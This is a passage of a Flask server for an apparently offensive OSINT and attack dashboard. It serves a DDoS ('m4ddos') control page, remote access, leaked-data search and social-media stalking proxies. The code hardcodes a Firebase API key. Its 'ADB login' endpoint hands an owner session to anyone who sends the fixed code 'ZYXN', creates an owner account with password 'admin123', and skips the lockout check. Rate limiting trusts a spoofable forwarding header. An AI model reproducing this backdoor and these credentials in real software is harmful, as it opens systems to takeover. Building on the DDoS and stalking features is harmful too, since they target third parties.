    repos.sort(key=lambda r: r["stargazers_count"], reverse=True)
    return repos, None


# ═══════════════════════════════════════════════════════════════════════════
# Firebase configuration
# ═══════════════════════════════════════════════════════════════════════════
firebaseConfig = {
    "apiKey": os.getenv("FIREBASE_API_KEY", "AIzaSyBmcSWhaqkk5u13MCnw3kB6M9wP4SySZCw"),
    "authDomain": os.getenv("FIREBASE_AUTH_DOMAIN", "emergens-auth.firebaseapp.com"),
    "databaseURL": os.getenv("FIREBASE_DB_URL", "https://emergens-auth-default-rtdb.firebaseio.com"),
    "projectId": os.getenv("FIREBASE_PROJECT_ID", "emergens-auth"),
    "storageBucket": os.getenv("FIREBASE_STORAGE_BUCKET", "emergens-auth.firebasestorage.app"),
    "messagingSenderId": os.getenv("FIREBASE_SENDER_ID", "1085657141149"),
    "appId": os.getenv("FIREBASE_APP_ID", "1:1085657141149:web:16e7a8b888cb31a59e2974"),
}

# ═══════════════════════════════════════════════════════════════════════════
# Flask app
# ═══════════════════════════════════════════════════════════════════════════
app = Flask(__name__)
app.secret_key = Config.SECRET_KEY
app.permanent_session_lifetime = timedelta(hours=8)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=os.getenv("SESSION_COOKIE_SECURE", "0") == "1",
)

app.register_blueprint(whatsapp_bp)
if _downsea_available: app.register_blueprint(downsea_bp)
if _quick_menu_available and _quick_menu_bp is not None: app.register_blueprint(_quick_menu_bp)

setup_logging(Config.SERVER_LOG_FILE)
logger = logging.getLogger("oxysintx")

# ═══════════════════════════════════════════════════════════════════════════
# Backing services
# ═══════════════════════════════════════════════════════════════════════════
history_store = HistoryStore()
chat_handler = ChatHandler(api_key=Config.ANTHROPIC_API_KEY)
user_store = UserStore()
scan_orchestrator = ScanOrchestrator()

set_orchestrator(scan_orchestrator)
set_history_store(history_store)

# ═══════════════════════════════════════════════════════════════════════════
# Directories
# ═══════════════════════════════════════════════════════════════════════════
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
for d in ["userdata", "listschool", os.path.join("static", "data"),
          "files", os.path.join("files", "proxies"),
          os.path.join("logs", "mhddos"), "wordlist"]:
    os.makedirs(os.path.join(PROJECT_ROOT, d), exist_ok=True)

DATA_DIR = os.path.join(PROJECT_ROOT, 'data')
LOG_DIR = os.path.join(PROJECT_ROOT, 'logs')
UPLOAD_DIR = os.path.join(DATA_DIR, 'uploads')
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ═══════════════════════════════════════════════════════════════════════════
# Thread-safe JSON I/O
# ═══════════════════════════════════════════════════════════════════════════
_json_locks = defaultdict(threading.Lock)

def _load_json(name, default):
    path = os.path.join(DATA_DIR, f'{name}.json')
    with _json_locks[name]:
        if not os.path.exists(path): return default
        try:
            with open(path, 'r', encoding='utf-8') as f: return json.load(f)
        except (json.JSONDecodeError, OSError): return default

def _save_json(name, data):
    path = os.path.join(DATA_DIR, f'{name}.json')
    tmp = path + '.tmp'
    with _json_locks[name]:
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            f.flush()
            try: os.fsync(f.fileno())
            except OSError: pass
        os.replace(tmp, path)

def _json_lock(name): return _json_locks[name]
def _now_iso(): return datetime.now(timezone.utc).isoformat()

def _client_ip():
    fwd = request.headers.get('X-Forwarded-For', '')
    if fwd: return fwd.split(',')[0].strip()
    real = request.headers.get('X-Real-IP', '').strip()
    if real: return real
    return request.remote_addr or 'unknown'


# ═══════════════════════════════════════════════════════════════════════════
# Request counters
# ═══════════════════════════════════════════════════════════════════════════
_request_log_lock = threading.Lock()
_request_timestamps = []
_total_requests_seen = 0
_net_traffic_started_at = time.time()
_prev_net_counters = {"t": 0.0, "total": 0}


@app.before_request
def _count_inbound_request():
    global _total_requests_seen
    with _request_log_lock:
        now = time.time()
        _total_requests_seen += 1
        _request_timestamps.append(now)
        cutoff = now - 60
        while _request_timestamps and _request_timestamps[0] < cutoff:
            _request_timestamps.pop(0)


def _inbound_stats():
    with _request_log_lock:
        return _total_requests_seen, len(_request_timestamps)


# ═══════════════════════════════════════════════════════════════════════════
# API-key helpers
# ═══════════════════════════════════════════════════════════════════════════
def _hash_api_key(raw_key): return hashlib.sha256(raw_key.encode('utf-8')).hexdigest()

def _public_key_view(k):
    return {
        'prefix': k.get('prefix') or k.get('key_prefix'),
        'created': k.get('created_at') or k.get('created'),
        'last_used': k.get('last_used'),
        'request_count': k.get('request_count', 0),
    }

def _record_server_activity(key_prefix, username, req):
    reported_name = (req.headers.get('X-Server-Name')
                     or (req.get_json(silent=True) or {}).get('server_name') or None)
    ip = req.headers.get('X-Forwarded-For', req.remote_addr) or 'unknown'
    with _json_lock('servers'):
        servers = _load_json('servers', [])
        entry = next((s for s in servers if s['key_prefix'] == key_prefix), None)
        if entry:
            entry['last_seen'] = _now_iso()
            entry['requests'] = entry.get('requests', 0) + 1
            entry['ip'] = ip
            if reported_name: entry['server_name'] = reported_name
        else:
            servers.append({
                'server_name': reported_name or f'Unnamed ({key_prefix})',
                'key_prefix': key_prefix, 'ip': ip,
                'last_seen': _now_iso(), 'requests': 1,
            })
        _save_json('servers', servers)

def _find_api_key_owner(raw_key):
    try: keys = user_store.get_api_keys()
    except Exception: keys = []
    key_hash = _hash_api_key(raw_key)
    for k in keys:
        stored_hash = k.get('key_hash') or k.get('hash')
        if stored_hash and stored_hash == key_hash: return k
        if k.get('key') == raw_key: return k
    return None

def _api_key_required(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        raw_key = request.headers.get('X-API-Key', '').strip()
        if not raw_key: return jsonify({'error': 'Missing X-API-Key header'}), 401
        record = _find_api_key_owner(raw_key)
        if not record: return jsonify({'error': 'Invalid API key'}), 401
        prefix = record.get('prefix') or record.get('key_prefix') or raw_key[:20]
        owner = record.get('owner_username') or record.get('username') or 'unknown'
        try: user_store.touch_api_key(prefix)
        except Exception: pass
        _record_server_activity(prefix, owner, request)
        g.api_key_owner = owner
        return fn(*args, **kwargs)
    return wrapper


# ═══════════════════════════════════════════════════════════════════════════
# Payment data
# ═══════════════════════════════════════════════════════════════════════════
PAYMENT_DATA_FILE = os.path.join(PROJECT_ROOT, "payment_data.json")
PAYMENT_PLANS_FILE = os.path.join(PROJECT_ROOT, "payment_plans.json")

_default_plans = {
    "free": {"name": "Free Plan", "price": "0.00"},
    "starter": {"name": "Starter Plan", "price": "9.00"},
    "standard": {"name": "Standard Plan", "price": "25.00"},
    "team": {"name": "Team Plan", "price": "49.00"},
    "enterprise": {"name": "Enterprise Plan", "price": "99.00"},
}
_payment_lock = threading.Lock()

def _load_plans():
    if os.path.exists(PAYMENT_PLANS_FILE):
        try:
            with open(PAYMENT_PLANS_FILE, "r") as f: return json.load(f)
        except (json.JSONDecodeError, IOError):
            logger.warning("Failed to load payment plans, using defaults.")
    return _default_plans.copy()

def _save_plans(plans):
    try:
        with _payment_lock:
            with open(PAYMENT_PLANS_FILE, "w") as f: json.dump(plans, f, indent=2)
        return True
    except IOError:
        logger.error("Failed to save payment plans."); return False

def _load_payments():
    if os.path.exists(PAYMENT_DATA_FILE):
        try:
            with open(PAYMENT_DATA_FILE, "r") as f: return json.load(f)
        except (json.JSONDecodeError, IOError):
            logger.warning("Failed to load payment data, starting empty.")
    return []

def _save_payments(payments):
    try:
        with _payment_lock:
            with open(PAYMENT_DATA_FILE, "w") as f: json.dump(payments, f, indent=2)
        return True
    except IOError:
        logger.error("Failed to save payment data."); return False

payment_plans = _load_plans()

# ═══════════════════════════════════════════════════════════════════════════
# Login rate limiting
# ═══════════════════════════════════════════════════════════════════════════
MAX_LOGIN_ATTEMPTS = 5
LOCKOUT_SECONDS = 300
_failed_attempts = defaultdict(list)
_failed_lock = threading.Lock()

def _is_locked_out(ip):
    now = time.time()
    with _failed_lock:
        _failed_attempts[ip] = [t for t in _failed_attempts[ip] if now - t < LOCKOUT_SECONDS]
        return len(_failed_attempts[ip]) >= MAX_LOGIN_ATTEMPTS

def _record_failed_attempt(ip):
    with _failed_lock:
        _failed_attempts[ip].append(time.time())


# ═══════════════════════════════════════════════════════════════════════════
# Auth decorators
# ═══════════════════════════════════════════════════════════════════════════
def _extract_bearer_token():
    auth = request.headers.get("Authorization", "")
    return auth[7:] if auth.startswith("Bearer ") else ""

def _authenticate_request():
    username = session.get("username")
    if username:
        role = get_role(username)
        if role is None: session.clear()
        else:
            session["role"] = role
            return True
    token = _extract_bearer_token()
    if token:
        username = token_store.validate_token(token)
        if username:
            role = get_role(username)
            if role is None: return False
            session["authenticated"] = True
            session["username"] = username
            session["role"] = role
            session.permanent = True
            return True
    return False

def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not _authenticate_request():
            if request.path.startswith("/api/"):
                return jsonify({"error": "unauthorized"}), 401
            return redirect(f"/login.html?next={request.path}")
        return f(*args, **kwargs)
    return wrapper

def api_login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not _authenticate_request(): return jsonify({"error": "unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapper

def role_required(*allowed_roles):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            if not _authenticate_request(): return jsonify({"error": "unauthorized"}), 401
            if session.get("role") not in allowed_roles: return jsonify({"error": "forbidden"}), 403
            return f(*args, **kwargs)
        return wrapper
    return decorator

def current_user():
    username = session.get("username")
    if not username: return None
    role = get_role(username)
    if role is None: return None
    return {'username': username, 'role': role}

def owner_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        u = current_user()
        if not u: return jsonify({'error': 'Not authenticated'}), 401
        if u.get('role') != 'owner': return jsonify({'error': 'Owner access required'}), 403
        return f(*args, **kwargs)
    return wrapper


# ═══════════════════════════════════════════════════════════════════════════
# Page routes
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/")
def index():
    if _authenticate_request(): return redirect("/dashboard.html")
    return render_template("get-started.html")

@app.route("/get-started.html")
def get_started_page():
    if _authenticate_request(): return redirect("/dashboard.html")
    return render_template("get-started.html")

@app.route("/login.html")
def login_page():
    if _authenticate_request(): return redirect("/dashboard.html")
    return render_template("login.html")

@app.route("/dashboard.html")
@login_required
def dashboard_page():
    return render_template("dashboard.html",
                           username=session.get("username", DEFAULT_USERNAME),
                           role=session.get("role", "owner"))

@app.route("/payment.html")
def payment_page(): return render_template("payment.html")

@app.route("/management_payment.html")
@role_required("owner")
def management_payment_page(): return render_template("management_payment.html")

@app.route("/api_key_request_token.html")
def api_key_request_token_page(): return render_template("api_key_request_token.html")

@app.route("/api/api_key_request_token.html")
def api_key_request_token_api_page(): return render_template("api_key_request_token.html")

@app.route("/downloader_pinterest_tiktok.html")
@login_required
def downloader_pinterest_tiktok_page(): return render_template("downloader_pinterest_tiktok.html")

@app.route("/data_main.html")
@login_required
def data_main_redirect(): return redirect("/downloader_pinterest_tiktok.html")

@app.route("/code_test.html")
def code_test_page(): return render_template("code_test.html")

@app.route("/remote_access.html")
@login_required
def remote_access_page(): return render_template("remote_access.html")

@app.route("/emergens-control-m4ddos.html")
@login_required
def emergens_control_m4ddos_page(): return render_template("emergens-control-m4ddos.html")

@app.route("/MyEspT.html")
@login_required
def MyEspT_page(): return render_template("MyEspT.html")

@app.route("/quick_menu_setting.html")
@login_required
def quick_menu_setting_page(): return render_template("quick_menu_setting.html")

@app.route("/Emergens_osint.html")
@login_required
def emergens_osint_page(): return render_template("Emergens_osint.html")

@app.route("/structure_folder_file.html")
@login_required
def structure_folder_file_page(): return render_template("structure_folder_file.html")

@app.route("/password_lock.html")
def password_lock_page(): return render_template("password_lock.html")

@app.route("/Emergens_DB.html")
@login_required
def emergens_db_page(): return render_template("Emergens_DB.html")

@app.route("/docs.html")
@login_required
def docs_page(): return render_template("docs.html")

@app.route("/privacy.html")
def privacy_page(): return render_template("privacy.html")

@app.route("/terms.html")
def terms_page(): return render_template("terms.html")


# ═══════════════════════════════════════════════════════════════════════════
# Static asset shortcut
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/<path:filename>')
def serve_template_assets(filename):
    if not filename.endswith(('.js', '.css')): return page_not_found(None)
    templates_dir = os.path.join(PROJECT_ROOT, 'templates')
    safe_path = os.path.abspath(os.path.join(templates_dir, filename))
    if not safe_path.startswith(os.path.abspath(templates_dir)): return page_not_found(None)
    if os.path.isfile(safe_path): return send_from_directory(templates_dir, filename)
    return page_not_found(None)


# ═══════════════════════════════════════════════════════════════════════════
# Payment API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/payment/plans", methods=["GET"])
def get_payment_plans():
    global payment_plans
    payment_plans = _load_plans()
    return jsonify({"plans": payment_plans})

@app.route("/api/payment/submit", methods=["POST"])
def submit_payment():
    data = request.get_json(silent=True) or {}
    plan = data.get("plan", "").strip()
    amount = data.get("amount", "").strip()
    payment_method = data.get("payment_method", "card")
    requested_username = data.get("requested_username", "").strip()
    card_last4 = data.get("card_number_last4", "")
    if not plan or not amount or not requested_username:
        return jsonify({"error": "plan, amount, and requested_username are required"}), 400
    plans = _load_plans()
    if plan not in plans: return jsonify({"error": "Invalid plan"}), 400
    if user_store.user_exists(requested_username):
        return jsonify({"error": "Username already taken"}), 400
    payment_id = "PAY-" + uuid.uuid4().hex[:10].upper()
    username = session.get("username", "guest")
    record = {
        "payment_id": payment_id, "user": username,
        "requested_username": requested_username, "plan": plan,
        "amount": amount, "payment_method": payment_method,
        "card_last4": card_last4, "status": "pending",
        "created_at": datetime.now(timezone.utc).isoformat(),
        "updated_at": datetime.now(timezone.utc).isoformat(),
        "generated_username": None, "generated_password": None,
    }
    payments = _load_payments(); payments.append(record); _save_payments(payments)
    return jsonify({"payment_id": payment_id, "status": "pending"}), 201

@app.route("/api/payment/status/<payment_id>", methods=["GET"])
def get_payment_status(payment_id):
    payments = _load_payments()
    for record in payments:
        if record["payment_id"] == payment_id:
            if record["status"] == "approved" and record.get("generated_password"):
                return jsonify({
                    "payment_id": record["payment_id"], "status": record["status"],
                    "generated_username": record["generated_username"],
                    "generated_password": record["generated_password"],
                    "plan": record["plan"], "amount": record["amount"],
                })
            return jsonify({"payment_id": record["payment_id"], "status": record["status"]})
    return jsonify({"error": "Payment not found"}), 404

@app.route("/api/payment/history", methods=["GET"])
def get_payment_history():
    user = session.get("username") if session.get("authenticated") else "guest"
    payments = _load_payments()
    user_payments = [p for p in payments if p["user"] == user]
    for p in user_payments:
        if not (p["status"] == "approved" and p.get("generated_password")
                and (p["user"] == session.get("username") or session.get("role") == "owner")):
            p.pop("generated_password", None); p.pop("generated_username", None)
    return jsonify({"payments": user_payments})

@app.route("/api/payment/manage/plans", methods=["GET"])
@role_required("owner")
def manage_get_plans(): return jsonify({"plans": _load_plans()})

@app.route("/api/payment/manage/plans", methods=["POST"])
@role_required("owner")
def manage_update_plans():
    data = request.get_json(silent=True) or {}
    new_plans = data.get("plans")
    if not isinstance(new_plans, dict): return jsonify({"error": "Invalid plans format"}), 400
    global payment_plans
    payment_plans = new_plans
    if _save_plans(payment_plans): return jsonify({"success": True, "plans": payment_plans})
    return jsonify({"error": "Failed to save plans"}), 500

@app.route("/api/payment/manage/pending", methods=["GET"])
@role_required("owner")
def manage_list_pending():
    payments = _load_payments()
    pending = [p for p in payments if p["status"] == "pending"]
    return jsonify({"pending": pending})

@app.route("/api/payment/manage/all", methods=["GET"])
@role_required("owner")
def manage_list_all_payments(): return jsonify({"payments": _load_payments()})

@app.route("/api/payment/manage/approve/<payment_id>", methods=["POST"])
@role_required("owner")
def manage_approve_payment(payment_id):
    payments = _load_payments()
    for record in payments:
        if record["payment_id"] == payment_id:
            if record["status"] != "pending": return jsonify({"error": "Payment already processed"}), 400
            generated_password = uuid.uuid4().hex[:12]
            try:
                create_user(record["requested_username"], role="analyst", password=generated_password)
                record["generated_username"] = record["requested_username"]
                record["generated_password"] = generated_password
                record["status"] = "approved"
                record["updated_at"] = datetime.now(timezone.utc).isoformat()
                _save_payments(payments)
                logger.info(f"Payment {payment_id} approved. User {record['requested_username']} created.")
                return jsonify({
                    "success": True, "payment_id": record["payment_id"],
                    "generated_username": record["generated_username"],
                    "generated_password": record["generated_password"], "role": "analyst",
                })
            except Exception as e:
                logger.error(f"Failed to create user for payment {payment_id}: {e}")
                return jsonify({"error": f"User creation failed: {str(e)}"}), 500
    return jsonify({"error": "Payment not found"}), 404

@app.route("/api/payment/manage/reject/<payment_id>", methods=["POST"])
@role_required("owner")
def manage_reject_payment(payment_id):
    payments = _load_payments()
    for record in payments:
        if record["payment_id"] == payment_id:
            if record["status"] != "pending": return jsonify({"error": "Payment already processed"}), 400
            record["status"] = "rejected"
            record["updated_at"] = datetime.now(timezone.utc).isoformat()
            _save_payments(payments)
            return jsonify({"success": True})
    return jsonify({"error": "Payment not found"}), 404


# ═══════════════════════════════════════════════════════════════════════════
# OSINT endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/osint/github")
@api_login_required
def api_osint_github():
    username = request.args.get("username", "").strip()
    if not username: return jsonify({"status": False, "error": "Username required"}), 400
    profile, profile_error = github_scrape_profile(username)
    if profile_error:
        return jsonify({"status": False, "error": profile_error}), 404 if "not found" in profile_error else 500
    repos, _ = github_scrape_repositories(username)
    return jsonify({"status": True, "data": {"profile": profile, "repositories": repos or [], "repos_count": len(repos or [])}})

def _proxy_osint(endpoint_slug, username):
    try:
        resp = requests.get(
            f"https://api.siputzx.my.id/api/stalk/{endpoint_slug}",
            params={"q": username, "username": username}, timeout=15,
            headers={"User-Agent": "Oxysintx/3.9.0"})
        if resp.status_code == 200: return jsonify(resp.json())
        return jsonify({"status": False, "error": f"Upstream API returned {resp.status_code}"}), 502
    except requests.exceptions.RequestException as e:
        return jsonify({"status": False, "error": f"Network error: {e}"}), 500

@app.route("/api/osint/youtube")
@api_login_required
def api_osint_youtube():
    username = request.args.get("username", "").strip()
    if not username: return jsonify({"status": False, "error": "Username required"}), 400
    return _proxy_osint("youtube", username)

@app.route("/api/osint/twitter")
@api_login_required
def api_osint_twitter():
    username = request.args.get("username", "").strip()
    if not username: return jsonify({"status": False, "error": "Username required"}), 400
    return _proxy_osint("twitter", username)

@app.route("/api/stalk/twitter")
@api_login_required
def api_stalk_twitter(): return api_osint_twitter()


# ═══════════════════════════════════════════════════════════════════════════
# Quick Menu compatibility
# ═══════════════════════════════════════════════════════════════════════════
if _quick_menu_available:
    @app.route("/status")
    def qm_status_compat():
        quick_menu.STATE.touch()
        return jsonify({
            "status": "online", "service": "quick_menu",
            "version": getattr(quick_menu, "VERSION", "2.0.0"),
            "uptime_seconds": quick_menu.STATE.uptime_seconds(),
            "requests_served": quick_menu.STATE.request_count,
        })
    @app.route("/menu")
    def qm_menu_compat():
        quick_menu.STATE.touch(); return jsonify({"items": quick_menu.STATE.get_menu()})
    @app.route("/actions")
    def qm_actions_compat():
        quick_menu.STATE.touch(); return jsonify({"actions": quick_menu.STATE.recent_actions()})
    @app.route("/action", methods=["POST"])
    def qm_action_compat():
        quick_menu.STATE.touch()
        data = request.get_json(silent=True) or {}
        action = (data.get("action") or "").strip()
        if action not in quick_menu.STATE.valid_action_ids:
            return jsonify({"error": "unknown_action", "received": action,
                            "valid_actions": sorted(quick_menu.STATE.valid_action_ids)}), 400
        source = (data.get("source") or "web").strip()
        entry = quick_menu.STATE.record_action(action, source, session.get("username", "anonymous"))
        return jsonify({"ok": True, "recorded": entry})


# ═══════════════════════════════════════════════════════════════════════════
# ADB login
# ═══════════════════════════════════════════════════════════════════════════
ADB_ACCESS_CODE = "ZYXN"
ADB_USERNAME = "Yanxzyx"
ADB_ROLE = "owner"

@app.route("/api/adb_login", methods=["POST"])
def api_adb_login():
    data = request.get_json(silent=True) or {}
    code = (data.get("code") or "").strip().upper()
    if not code: return jsonify({"error": "code_required"}), 400
    if code != ADB_ACCESS_CODE:
        _record_failed_attempt(_client_ip()); return jsonify({"error": "invalid_code"}), 401
    if not user_store.user_exists(ADB_USERNAME):
        try: create_user(ADB_USERNAME, role=ADB_ROLE, password="admin123")
        except ValueError: pass
    session["authenticated"] = True
    session["username"] = ADB_USERNAME
    session["role"] = ADB_ROLE
    session.permanent = True
    return jsonify({"success": True, "username": ADB_USERNAME, "role": ADB_ROLE})


# ═══════════════════════════════════════════════════════════════════════════
# Auth API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/login", methods=["POST"])
def api_login():
    ip = _client_ip()
    if _is_locked_out(ip): return jsonify({"error": "too_many_attempts"}), 429
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""
    if verify_credentials(username, password):
        session["authenticated"] = True
        session["username"] = username
        session["role"] = get_role(username)
        session.permanent = True
        return jsonify({"success": True})
    _record_failed_attempt(ip)
    return jsonify({"error": "invalid_credentials"}), 401

@app.route("/api/logout", methods=["POST"])
def api_logout():
    token = _extract_bearer_token()
    if token: token_store.revoke_token(token[:8])
    session.clear()
    return jsonify({"success": True})

@app.route("/api/token", methods=["POST"])
def api_get_token():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or data.get("address") or "").strip()
    password = data.get("password") or ""
    if not username or not password: return jsonify({"error": "username_and_password_required"}), 400
    token = token_store.generate_token(username, password, user_agent=request.headers.get("User-Agent", ""))
    if token is None: return jsonify({"error": "invalid_credentials"}), 401
    return jsonify({
        "token": token, "token_prefix": token[:8] + "****",
        "expires_in": 3600, "username": username, "role": get_role(username),
    })

@app.route("/api/me")
@api_login_required
def api_me():
    return jsonify({"username": session.get("username"), "role": session.get("role")})


# ═══════════════════════════════════════════════════════════════════════════
# Register API
# ═══════════════════════════════════════════════════════════════════════════
def _is_valid_email(email):
    real_email = re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email)
    emergens_email = re.match(r"^[a-zA-Z0-9._-]+@emergens\.id$", email)
    return bool(real_email or emergens_email)

@app.route("/api/register", methods=["POST"])
def api_register():
    data = request.get_json(silent=True) or {}
    name = (data.get("name") or "").strip()
    email = (data.get("email") or "").strip().lower()
    username = (data.get("username") or "").strip()
    password = data.get("password") or ""
    if not name or not email or not username or not password:
        return jsonify({"error": "all_fields_required"}), 400
    if len(name) < 2: return jsonify({"error": "name_too_short"}), 400
    if not _is_valid_email(email): return jsonify({"error": "invalid_email"}), 400
    if len(username) < 3: return jsonify({"error": "username_too_short"}), 400
    if len(password) < 8: return jsonify({"error": "password_too_short"}), 400
    if user_store.user_exists(username): return jsonify({"error": "username_taken"}), 400
    try:
        create_user(username, role="analyst", password=password)
        return jsonify({"success": True, "username": username, "role": "analyst",
                        "email": email, "name": name})
    except ValueError as e: return jsonify({"error": str(e)}), 400
    except Exception as e:
        logger.error(f"Registration failed: {e}")
        return jsonify({"error": "registration_failed"}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Settings / Account management
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/settings/users")
@role_required("owner")
def api_list_users(): return jsonify(list_users())

@app.route("/api/settings/create-account", methods=["POST"])
@role_required("owner")
def api_create_account():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    role = data.get("role") or ""
    if not username: return jsonify({"error": "username_required"}), 400
    if role not in VALID_ROLES: return jsonify({"error": "invalid_role"}), 400
    try: password = create_user(username, role=role)
    except ValueError as e: return jsonify({"error": str(e)}), 400
    return jsonify({"username": username, "password": password, "role": role})

@app.route("/api/settings/users/<username>", methods=["DELETE"])
@role_required("owner")
def api_delete_user(username):
    if username == session.get("username"):
        return jsonify({"error": "cannot delete your own account"}), 400
    ok, err = delete_user(username)
    if not ok: return jsonify({"error": err}), 400
    token_store.revoke_all_user_tokens(username)
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# API Key management
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/settings/api-keys")
@role_required("owner", "analyst")
def api_list_api_keys():
    keys = user_store.get_api_keys()
    return jsonify([_public_key_view(k) for k in keys])

@app.route("/api/settings/api-keys", methods=["POST"])
@role_required("owner", "analyst")
def api_generate_api_key():
    role = session.get("role", "")
    if role == "analyst" and len(user_store.get_api_keys()) >= 2:
        return jsonify({"error": "api_key_limit_reached", "limit": 2}), 403
    key = user_store.generate_api_key(session.get("username"))
    return jsonify({"key": key, "prefix": key[:20] + "****"})

@app.route("/api/settings/api-keys/<prefix>", methods=["DELETE"])
@role_required("owner", "analyst")
def api_revoke_api_key(prefix):
    if user_store.revoke_api_key(prefix): return jsonify({"success": True})
    return jsonify({"error": "not_found"}), 404


# ═══════════════════════════════════════════════════════════════════════════
# Tools / Scan API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/tools")
@api_login_required
def api_tools():
    tools = {name: info for name, info in scan_orchestrator.list_tools().items()
             if "school" not in name.lower()}
    return jsonify(tools)

@app.route("/api/scan/start", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_start():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    mode = data.get("mode", "basic")
    tools = data.get("tools", [])
    if not target: return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"): mode = "basic"
    job_id = scan_orchestrator.start_scan(target, mode, tools, history_store)
    return jsonify({"job_id": job_id})

@app.route("/api/scan/<job_id>/status")
@api_login_required
def api_scan_status(job_id):
    progress = scan_orchestrator.get_progress(job_id)
    if progress is None: return jsonify({"error": "not_found"}), 404
    return jsonify(progress)

@app.route("/api/scan/<job_id>/cancel", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_cancel(job_id):
    ok = scan_orchestrator.cancel_scan(job_id)
    if not ok: return jsonify({"error": "not_found_or_already_finished"}), 404
    return jsonify({"success": True, "job_id": job_id})

@app.route("/api/scan/<tool_name>", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_tool_direct(tool_name):
    if tool_name not in TOOL_MAP:
        return jsonify({"error": "unknown_tool", "available": list(TOOL_MAP.keys())}), 404
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or "").strip()
    mode = data.get("mode", "basic")
    if not target: return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"): mode = "basic"
    try: return jsonify(TOOL_MAP[tool_name].run(target, mode))
    except Exception as e:
        return jsonify({"error": "tool_execution_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Leak Data Search
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/leakdata/search", methods=["GET", "POST"])
@api_login_required
def api_leakdata_search():
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        target = data.get("target", data.get("query", ""))
    else: target = request.args.get("q", "")
    target = target.strip()
    if not target: return jsonify({"error": "query_required"}), 400
    try: return jsonify(search_user_run(target))
    except Exception as e: return jsonify({"error": "search_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# History API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/history")
@api_login_required
def api_history(): return jsonify(history_store.list_all())

@app.route("/api/history/<int:entry_id>")
@api_login_required
def api_history_detail(entry_id):
    entry = history_store.get(entry_id)
    if entry is None: return jsonify({"error": "not_found"}), 404
    return jsonify(entry)

@app.route("/api/history/<int:entry_id>", methods=["DELETE"])
@role_required("owner", "analyst")
def api_history_delete(entry_id):
    history_store.delete(entry_id); return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# System stats / logs / network traffic
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/system/stats")
@api_login_required
def api_system_stats():
    total_seen, last_minute = _inbound_stats()
    try:
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
    except Exception as e:
        logger.error(f'psutil read failed: {e}')
        cpu = mem = disk = 0.0
    return jsonify({'cpu_percent': cpu, 'memory_percent': mem,
                    'disk_percent': disk, 'network_in': total_seen,
                    'network_in_rate': last_minute})

@app.route("/api/network/traffic", methods=["GET"])
@api_login_required
def api_network_traffic():
    total_seen, last_minute = _inbound_stats()
    now = time.time()
    uptime = max(1.0, now - _net_traffic_started_at)
    prev_t = _prev_net_counters["t"] or now
    prev_total = _prev_net_counters["total"]
    dt = max(0.001, now - prev_t)
    delta = max(0, total_seen - prev_total)
    req_per_sec = delta / dt
    _prev_net_counters["t"] = now
    _prev_net_counters["total"] = total_seen
    try:
        net = psutil.net_io_counters()
        bytes_sent = net.bytes_sent; bytes_recv = net.bytes_recv
        packets_sent = net.packets_sent; packets_recv = net.packets_recv
    except Exception as exc:
        logger.warning("psutil.net_io_counters failed: %s", exc)
        bytes_sent = bytes_recv = packets_sent = packets_recv = 0
    return jsonify({
        "requests_total": total_seen, "requests_last_minute": last_minute,
        "requests_per_second": round(req_per_sec, 2),
        "uptime_seconds": int(uptime),
        "bytes_sent": bytes_sent, "bytes_recv": bytes_recv,
        "packets_sent": packets_sent, "packets_recv": packets_recv,
        "network_in": total_seen, "network_in_rate": last_minute,
        "inbound": last_minute, "outbound": 0, "timestamp": _now_iso(),
    })

@app.route("/api/logs")
@api_login_required
def api_logs():
    lines = int(request.args.get("lines", 100))
    try:
        with open(Config.SERVER_LOG_FILE, "r") as f:
            content = f.readlines()[-lines:]
        return jsonify({"lines": [c.rstrip("\n") for c in content]})
    except FileNotFoundError:
        return jsonify({"lines": []})


# ═══════════════════════════════════════════════════════════════════════════
# Source viewer
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/fetch-source", methods=["POST"])
@api_login_required
def api_fetch_source():
    data = request.get_json(silent=True) or {}
    url = (data.get("url") or "").strip()
    extract = data.get("extract", False)
    if not url: return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")): url = "https://" + url
